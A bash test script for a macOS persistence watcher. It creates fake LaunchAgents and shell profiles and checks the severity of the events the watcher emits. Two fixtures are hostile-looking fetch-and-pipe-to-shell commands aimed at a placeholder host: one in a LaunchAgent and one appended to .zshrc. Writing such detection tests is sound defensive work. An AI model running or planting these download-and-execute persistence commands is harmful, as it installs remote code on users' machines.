#!/bin/bash

# ===============================
# Persistence Watcher Tests
# Builds fake LaunchAgents and shell profiles, then checks that added,
# modified and removed items produce the right persistence_change events.
# ===============================

set -uo pipefail

TESTS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WATCHER="$TESTS_DIR/../daemons/persistence_watcher.sh"

# Not under /tmp or /var/folders: the watcher treats those as risky locations.
WORK="$(mktemp -d "$TESTS_DIR/persistence_work.XXXXXX")"
trap 'rm -rf "$WORK"' EXIT

export HOME="$WORK/home"
mkdir -p "$HOME" "$WORK/agents" "$WORK/bin"
export MG_PERSISTENCE_DIRS="$WORK/agents"
export MG_PERSISTENCE_PROFILES="$HOME/.zshrc"
export MG_PERSISTENCE_CHECK_INTERVAL=0
echo 'export PATH="$HOME/bin:$PATH"' > "$HOME/.zshrc"

source "$WATCHER"
# event_writer.sh turns on set -e; these tests report failures themselves.
set +e

failures=0
pass() { echo "PASS: $1"; }
fail() { echo "FAIL: $1"; failures=$((failures + 1)); }

EVENT_DIR="$HOME/.macguardian/events"

# Field of the newest event whose path matches
event_field() {
    local path="$1" field="$2"
    python3 -I - "$EVENT_DIR" "$path" "$field" <<'PY'
import json, os, sys
d, path, field = sys.argv[1:]
events = []
for name in os.listdir(d) if os.path.isdir(d) else []:
    with open(os.path.join(d, name)) as f:
        e = json.load(f)
    if e["event_type"] == "persistence_change" and e["context"]["path"] == path:
        events.append((os.path.getmtime(os.path.join(d, name)), e))
if events:
    e = sorted(events, key=lambda x: x[0])[-1][1]
    print(e["context"][field] if field in e["context"] else e[field])
PY
}

# Captured first: with pipefail, grep -q closing the pipe early fails the pipeline
has_reason() {
    local reasons
    reasons=$(event_field "$1" reasons)
    [[ "$reasons" == *"$2"* ]]
}

event_count() {
    find "$EVENT_DIR" -name 'event_*.json' -type f 2>/dev/null | wc -l | tr -d ' '
}

make_agent() {
    local name="$1"
    shift
    local args=""
    local a
    for a in "$@"; do
        args="$args<string>$a</string>"
    done
    cat > "$WORK/agents/$name.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>$name</string>
<key>ProgramArguments</key><array>$args</array>
<key>RunAtLoad</key><true/>
</dict></plist>
EOF
}

# Fixture programs: unsigned and ad-hoc copies of a system binary
cp /bin/ls "$WORK/bin/unsigned_tool"
codesign --remove-signature "$WORK/bin/unsigned_tool" 2>/dev/null
mkdir -p "$WORK/bin/.hidden"
cp /bin/ls "$WORK/bin/.hidden/agent"
codesign --force -s - "$WORK/bin/.hidden/agent" 2>/dev/null

# --- First check only records a baseline ---
make_agent com.test.existing /bin/ls
check_persistence_changes > /dev/null
if [ -f "$PERSISTENCE_BASELINE" ] && [ "$(event_count)" = "0" ]; then
    pass "first check creates a baseline without events"
else
    fail "first check creates a baseline without events"
fi

# --- Added items ---
make_agent com.test.apple /bin/ls -la
make_agent com.test.unsigned "$WORK/bin/unsigned_tool"
make_agent com.test.inline /bin/bash -c "curl -s http://example.invalid/x | sh"
make_agent com.test.hidden "$WORK/bin/.hidden/agent"
make_agent com.test.missing "$WORK/bin/does_not_exist"
check_persistence_changes > /dev/null

[ "$(event_field "$WORK/agents/com.test.apple.plist" signature_status)" = "apple" ] \
    && [ "$(event_field "$WORK/agents/com.test.apple.plist" severity)" = "low" ] \
    && pass "Apple-signed program is low severity" || fail "Apple-signed program is low severity"

[ "$(event_field "$WORK/agents/com.test.unsigned.plist" signature_status)" = "unsigned" ] \
    && [ "$(event_field "$WORK/agents/com.test.unsigned.plist" severity)" = "high" ] \
    && pass "unsigned program is high severity" || fail "unsigned program is high severity"

[ "$(event_field "$WORK/agents/com.test.inline.plist" severity)" = "high" ] \
    && has_reason "$WORK/agents/com.test.inline.plist" "inline code" \
    && pass "inline download command is high severity" || fail "inline download command is high severity"

[ "$(event_field "$WORK/agents/com.test.hidden.plist" signature_status)" = "adhoc" ] \
    && has_reason "$WORK/agents/com.test.hidden.plist" "hidden location" \
    && pass "ad-hoc program in a hidden folder is flagged" || fail "ad-hoc program in a hidden folder is flagged"

[ "$(event_field "$WORK/agents/com.test.missing.plist" signature_status)" = "missing" ] \
    && pass "missing program is reported" || fail "missing program is reported"

[ "$(event_field "$WORK/agents/com.test.apple.plist" change_type)" = "added" ] \
    && pass "new items are reported as added" || fail "new items are reported as added"

# --- No changes, no events ---
before=$(event_count)
check_persistence_changes > /dev/null
[ "$(event_count)" = "$before" ] && pass "unchanged items produce no events" || fail "unchanged items produce no events"

# --- Modified and removed ---
make_agent com.test.existing "$WORK/bin/unsigned_tool"
rm "$WORK/agents/com.test.missing.plist"
check_persistence_changes > /dev/null

[ "$(event_field "$WORK/agents/com.test.existing.plist" change_type)" = "modified" ] \
    && has_reason "$WORK/agents/com.test.existing.plist" "signature went from apple to unsigned" \
    && pass "modified item reports the signature change" || fail "modified item reports the signature change"

[ "$(event_field "$WORK/agents/com.test.missing.plist" change_type)" = "removed" ] \
    && [ "$(event_field "$WORK/agents/com.test.missing.plist" severity)" = "low" ] \
    && pass "removed item is low severity" || fail "removed item is low severity"

# --- Shell profile edits ---
echo 'curl -s http://example.invalid/payload | bash' >> "$HOME/.zshrc"
check_persistence_changes > /dev/null
[ "$(event_field "$HOME/.zshrc" severity)" = "high" ] \
    && pass "profile that downloads code is high severity" || fail "profile that downloads code is high severity"

# --- Root LaunchDaemons escalate to critical ---
assessed=$(_persistence_assess launchd /Library/LaunchDaemons/com.test.plist "$WORK/bin/unsigned_tool" unsigned "$WORK/bin/unsigned_tool")
[ "${assessed%%$'\t'*}" = "critical" ] \
    && pass "unsigned LaunchDaemon is critical" || fail "unsigned LaunchDaemon is critical"

# --- Monitor entry point skips work when nothing changed ---
detect_persistence_changes > /dev/null
before=$(event_count)
detect_persistence_changes > /dev/null
[ "$(event_count)" = "$before" ] && pass "unchanged fingerprint skips the full check" || fail "unchanged fingerprint skips the full check"
make_agent com.test.late /bin/ls
detect_persistence_changes > /dev/null
[ "$(event_field "$WORK/agents/com.test.late.plist" change_type)" = "added" ] \
    && pass "changed fingerprint runs the full check" || fail "changed fingerprint runs the full check"

# --- Identical events in the same second each get their own file ---
before=$(event_count)
for _ in 1 2 3 4 5; do
    write_event persistence_change high persistence_watcher '{"path": "/same"}'
done
[ "$(event_count)" = "$((before + 5))" ] \
    && pass "same-second identical events don't overwrite each other" \
    || fail "same-second identical events don't overwrite each other"

# --- Every event is valid JSON with the right type and source ---
if python3 -I - "$EVENT_DIR" <<'PY'
import json, os, sys
d = sys.argv[1]
for name in os.listdir(d):
    with open(os.path.join(d, name)) as f:
        e = json.load(f)
    assert e["event_type"] == "persistence_change", name
    assert e["source"] == "persistence_watcher", name
    assert e["severity"] in ("low", "medium", "high", "critical"), name
PY
then
    pass "events are valid Event Spec JSON"
else
    fail "events are valid Event Spec JSON"
fi

# --- CLI inventory ---
[[ "$(bash "$WATCHER" scan)" == *"need a look"* ]] \
    && pass "scan prints an inventory" || fail "scan prints an inventory"

if [ "$failures" -eq 0 ]; then
    echo "All persistence watcher tests passed"
    exit 0
fi
echo "$failures persistence watcher test(s) failed"
exit 1
